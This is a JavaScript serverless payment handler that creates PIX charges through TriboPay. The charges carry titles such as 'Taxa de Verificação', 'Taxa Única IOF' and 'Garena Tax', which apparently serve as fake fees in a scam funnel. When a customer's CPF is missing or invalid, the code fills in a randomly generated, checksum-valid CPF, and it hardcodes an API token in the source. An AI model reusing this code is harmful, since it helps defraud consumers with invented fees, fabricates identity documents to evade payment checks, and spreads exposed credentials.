function generateCPF() {
  const rand = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);
  const n1 = rand(1, 9), n2 = rand(0, 9), n3 = rand(0, 9), n4 = rand(0, 9);
  const n5 = rand(0, 9), n6 = rand(0, 9), n7 = rand(0, 9), n8 = rand(0, 9), n9 = rand(0, 9);
  
  let d1 = n9 * 2 + n8 * 3 + n7 * 4 + n6 * 5 + n5 * 6 + n4 * 7 + n3 * 8 + n2 * 9 + n1 * 10;
  d1 = 11 - (d1 % 11);
  if (d1 >= 10) d1 = 0;
  
  let d2 = d1 * 2 + n9 * 3 + n8 * 4 + n7 * 5 + n6 * 6 + n5 * 7 + n4 * 8 + n3 * 9 + n2 * 10 + n1 * 11;
  d2 = 11 - (d2 % 11);
  if (d2 >= 10) d2 = 0;
  
  return `${n1}${n2}${n3}${n4}${n5}${n6}${n7}${n8}${n9}${d1}${d2}`;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Content-Type', 'application/json');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const data = req.body || {};
  const type = req.query.type || 'verificacao';

  let productHash, offerHash, amountCents, title;

  if (type === 'up4') {
    productHash = 'ryftojn8lo';
    offerHash = '059pr';
    amountCents = 1690;
    title = 'Passe de Acesso';
  } else if (type === 'iof') {
    productHash = 'ryftojn8lo';
    offerHash = 'r6loo7aos5';
    amountCents = 1690;
    title = 'Taxa Única IOF';
  } else if (type === 'garenatax') {
    productHash = 'axfxahm3pu';
    offerHash = '5tmuw';
    amountCents = 1490;
    title = 'Garena Tax';
  } else if (type === 'garenareserve') {
    productHash = 'vzcdnj8le9';
    offerHash = 'gPBDzYrZ';
    amountCents = 2299;
    title = 'Garena Reserve';
  } else {
    // verificacao
    productHash = 'ch3xepvlc4';
    offerHash = 'blureagqro';
    amountCents = 1690;
    title = 'Taxa de Verificação';
  }

  const customerName = data.customerName || 'Cliente';
  const customerEmail = data.customerEmail || 'cliente@example.com';
  const customerPhone = (data.customerPhone || '').replace(/[^0-9]/g, '') || '11999999999';
  let customerDocument = (data.customerDocument || '').replace(/[^0-9]/g, '');

  if (customerDocument.length !== 11 || /^(\d)\1{10}$/.test(customerDocument)) {
    customerDocument = generateCPF();
  }

  const apiToken = "2tSdUJvzVh345Pr7w0BSJMrizSOZiEPtWyikTbQ5ipYGSITTXTjisZC4ikb5";

  const payload = {
    product_hash: productHash,
    offer_hash: offerHash,
    amount: amountCents,
    payment_method: "pix",
    customer: {
      name: customerName,
      email: customerEmail,
      phone_number: customerPhone,
      document: customerDocument
    },
    cart: [
      {
        title: title,
        price: amountCents,
        quantity: 1,
        operation_type: 1,
        tangible: false,
        product_hash: productHash
      }
    ],
    expire_in_days: 1,
    transaction_origin: "op1"
  };

  const trackingParams = {
    utm_source: data.utm_source || '',
    utm_medium: data.utm_medium || '',
    utm_campaign: data.utm_campaign || '',
    utm_content: data.utm_content || '',
    utm_term: data.utm_term || '',
    src: data.src || '',
    sck: data.sck || '',
    fbclid: data.fbclid || '',
    fbc: data.fbc || '',
    fbp: data.fbp || ''
  };

  for (const key in trackingParams) {
    if (!trackingParams[key]) {
      delete trackingParams[key];
    }
  }

  if (Object.keys(trackingParams).length > 0) {
    payload.metadata = trackingParams;
    payload.custom_data = trackingParams;
    Object.assign(payload, trackingParams);
  }

  try {
    const fetchResponse = await fetch(`https://api.tribopay.com.br/api/public/v1/transactions?api_token=${apiToken}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    const txRes = await fetchResponse.json();

    let pixCode = null;
    let txId = null;

    if (txRes?.pix?.pix_qr_code) {
      pixCode = txRes.pix.pix_qr_code;
    } else if (txRes?.data?.pix?.pix_qr_code) {
      pixCode = txRes.data.pix.pix_qr_code;
    } else if (txRes?.data?.pix_code) {
      pixCode = txRes.data.pix_code;
    } else if (txRes?.pix_code) {
      pixCode = txRes.pix_code;
    }

    if (txRes?.hash) {
      txId = txRes.hash;
    } else if (txRes?.data?.hash) {
      txId = txRes.data.hash;
    }

    if (pixCode && txId) {
      const qrCodeUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixCode);
      return res.status(200).json({
        success: true,
        // Schema 1 (verificacao, garenareserve)
        pixCode: pixCode,
        qrCode: qrCodeUrl,
        paymentIntentId: txId,
        // Schema 2 (iof, up4, garenatax)
        id: txId,
        pix: {
          qrcode: pixCode
        }
      });
    } else {
      return res.status(200).json({
        success: false,
        error: "Falha ao gerar PIX para o Upsell",
        details: txRes
      });
    }
  } catch (error) {
    return res.status(500).json({
      error: "Erro de rede ao conectar com TriboPay",
      details: error.message
    });
  }
}
